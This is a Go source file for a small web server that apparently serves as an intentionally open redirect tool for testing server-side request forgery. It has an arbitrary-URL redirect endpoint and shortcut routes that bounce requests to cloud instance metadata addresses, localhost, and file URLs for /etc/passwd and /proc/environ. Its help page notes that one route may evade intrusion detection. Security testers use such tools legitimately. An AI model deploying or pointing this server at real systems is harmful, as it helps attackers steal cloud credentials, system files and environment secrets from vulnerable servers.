package main

import (
        "fmt"
        "github.com/MadAppGang/httplog"
        "github.com/gorilla/mux"
        "io/ioutil"
        "net/http"
        "strconv"
)

func main() {
        s := mux.NewRouter()
        s.HandleFunc("/redirect", redirect)
        s.HandleFunc("/metadata", metadata)
        s.HandleFunc("/metadata6", metadata6)
        s.HandleFunc("/localhost", localhost)
        s.HandleFunc("/zeroes", zeroes)
        s.HandleFunc("/passwd", passwd)
        s.HandleFunc("/services", services)
        s.HandleFunc("/environ", environ)
        s.HandleFunc("/", docs)
        s.HandleFunc("/{id:[0-9]+}", nid)
        s.HandleFunc("/redirect", redirect).Methods("POST")
        s.HandleFunc("/diy", diy)
        s.HandleFunc("/metadata", metadata).Methods("POST")
        s.HandleFunc("/metadata6", metadata6).Methods("POST")
        s.HandleFunc("/localhost", localhost).Methods("POST")
        s.HandleFunc("/zeroes", zeroes).Methods("POST")
        s.HandleFunc("/passwd", passwd).Methods("POST")
        s.HandleFunc("/services", services).Methods("POST")
        s.HandleFunc("/environ", environ).Methods("POST")
        s.HandleFunc("/", docs).Methods("POST")
        s.HandleFunc("/{id:[0-9]+}", nid).Methods("POST")
        s.Use(httplog.Logger)
        s.Use(httplog.LoggerWithFormatter(httplog.RequestHeaderLogFormatter))

        http.ListenAndServe(":80", s)
}

func redirect(w http.ResponseWriter, r *http.Request) {
        typeint := 301
        key := r.URL.Query().Get("url")
        typ := r.URL.Query().Get("type")
        if len(typ) > 0 {
                typeint, _ = strconv.Atoi(typ)
        }
        if len(key) == 0 {
                key = "https://example.com"
        }
        http.Redirect(w, r, key, typeint)
}

func nid(w http.ResponseWriter, r *http.Request) {
        vars := mux.Vars(r)
        id := vars["id"]
        key := r.URL.Query().Get("url")
        if len(key) == 0 {
                key = "https://example.com"
        }
        nid, err := strconv.Atoi(id)
        if err != nil {
                nid = 301
        }
        http.Redirect(w, r, key, nid)
}

func metadata(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "http://169.254.169.254/latest/meta-data/", 301)
}

func metadata6(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "http://[fd00:ec2::254]/latest/meta-data/", 301)
}

func zeroes(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "http://0.0.0.0/", 301)
}

func localhost(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "http://127.0.0.1/", 301)
}

func passwd(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "file:///etc/passwd", 301)
}

func services(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "file:///etc/services", 301)
}

func environ(w http.ResponseWriter, r *http.Request) {
        http.Redirect(w, r, "file:///self/proc/environ", 301)
}

func docs(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "<html><head><title>The intentionally open redirect</title><body><h3>Intentionally open redirect binary</h3>Example usage:<ul><li>/redirect?url=https://example.com&type=302</li><li>/{301,302,303,307,308}?url=http://example.com</li><li>/metadata: shortcut for /redirect?url=http://169.254.169.254/latest/meta-data/</li><li>/metadata6: shortcut  for /redirct?url=http://[fd00:ec2::254]/latest/meta-data/</li><li>/localhost: shortcut for /redirect?url=http://127.0.0.1</li><li>/zeroes: shortcut for /redirct?url=http://0.0.0.0</li><li>/passwd: shortcut for /redirect?url=file:////etc/passwd</li><li>/services: shortcut for /redirct?url=file:///etc/services (avoid IDS maybe...)</li><li>/environ: shortcut for /redirect?url=file:///self/proc/environ</li></ul><p><a>Original tool:</a> <a href=\"https://gitlab.com/wtfismyip/301party/\">DIY</a>")
}

func diy(w http.ResponseWriter, r *http.Request) {
        contents, err := ioutil.ReadFile("./301party.go")
        if err != nil {
                w.WriteHeader(http.StatusNotFound)
                fmt.Fprintf(w, "No such page!")
                return
        }
        w.Header().Set("Content-Type", "text/plain")
        w.Write(contents)
}
